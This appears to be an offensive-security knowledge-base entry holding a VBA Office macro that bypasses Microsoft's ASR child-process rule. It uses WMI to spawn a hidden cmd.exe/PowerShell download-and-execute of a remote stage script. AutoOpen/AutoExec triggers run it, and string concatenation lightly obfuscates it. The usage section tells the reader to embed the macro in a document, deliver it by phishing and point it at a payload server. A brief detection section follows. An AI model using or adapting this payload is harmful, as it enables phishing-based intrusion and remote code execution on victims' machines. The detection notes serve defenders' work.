---
id: 209a0a44-3284-4eef-b18c-ccc6451853e3
name: VBA-ASR-Bypass-via-WMI-Process-Creation
type: code
language: vba
verified: true
created_at: '2023-04-06T03:56:23.581306+00:00'
updated_at: '2023-04-10T20:36:53.438562+00:00'
platforms:
  - Windows
tags:
  - asr-bypass
  - wmi
  - office-macro
  - payload
validated: true
---

# VBA-ASR-Bypass-via-WMI-Process-Creation

## Code

```vba
Sub ASR_bypass_create_child_process_rule5()
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("win" & "mgmts" & ":\\" & strComputer & "\root" & "\cimv2")
    Set objStartup = objWMIService.Get("Win32_" & "Process" & "Startup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\" & strComputer & "\root" & "\cimv2" & ":Win32_" & "Process")
    objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'http://10.10.10.10/stage.ps1')", Null, objConfig, intProcessID
End Sub

Sub AutoExec()
    ASR_bypass_create_child_process_rule5
End Sub

Sub AutoOpen()
    ASR_bypass_create_child_process_rule5
End Sub
```

## Description

This VBA macro code creates a hidden child process using WMI to execute cmd.exe, which in turn runs PowerShell to download and invoke a remote script, bypassing ASR Rule 5 restrictions on Office-to-PowerShell execution.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| http://10.10.10.10/stage.ps1 | URL of the remote PowerShell payload to download and execute | http://attacker.com/payload.ps1 |
| HIDDEN_WINDOW | Window visibility constant (0 = hidden) | 0 |
| strComputer | Target computer ("." for local) | "." |

## Usage

Embed this macro in an Office document (e.g., .docm) and deliver via phishing. Enable macros on the target; AutoOpen/AutoExec triggers on document open. Replace the URL with your payload server. Used in initial access or execution phases for red teaming or malware delivery.

## Detection

- Enable Office macro logging and ASR telemetry in Windows Defender.
- Monitor WMI events (Event ID 19) for Win32_Process.Create with cmd.exe/PowerShell arguments.
- Network monitoring for IWR fetches to suspicious domains from Office processes.
- Process auditing for hidden windows spawned via WMI (tools like Sysmon with WMI rules).

## Related

- [[procedures/Bypass-ASR-Rule-5-via-WMI-to-Execute-PowerShell]]
